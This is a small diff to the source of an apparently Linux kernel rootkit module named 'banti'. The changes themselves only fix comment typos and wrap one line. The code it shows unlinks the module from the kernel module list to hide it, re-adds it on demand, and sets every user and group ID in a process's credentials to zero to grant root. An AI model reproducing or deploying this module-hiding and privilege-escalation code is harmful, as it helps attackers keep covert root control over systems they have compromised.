@@ -66,7 +66,7 @@ void init_banti(void)
 ---------------------------------------------*/
 void banti_module_hide(void)
 {
-    /* Check if alredy hided */
+    /* Check if alredy hidden */
     if (fl->module_hidden) return;
 
     /* Delete in module list */
@@ -90,12 +90,13 @@ void banti_module_show(void)
 {
     int result;
     
-    /* Check if alredy hided */
+    /* Check if alredy hidden */
     if (!fl->module_hidden) return;
 
     /* Add module in list */
     list_add(&THIS_MODULE->list, module_prev);
-    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
+    result = kobject_add(&THIS_MODULE->mkobj.kobj, 
+        THIS_MODULE->mkobj.kobj.parent, "rt");
 
     /* Flag down */
     fl->module_hidden = 0;
@@ -113,7 +114,7 @@ void banti_got_root(void)
     /* Check valid credintials */
     if(creds)
     {
-        /* Get root indifier */
+        /* Set root indifier */
         creds->uid.val = creds->gid.val = 0;
         creds->euid.val = creds->egid.val = 0;
         creds->suid.val = creds->sgid.val = 0;
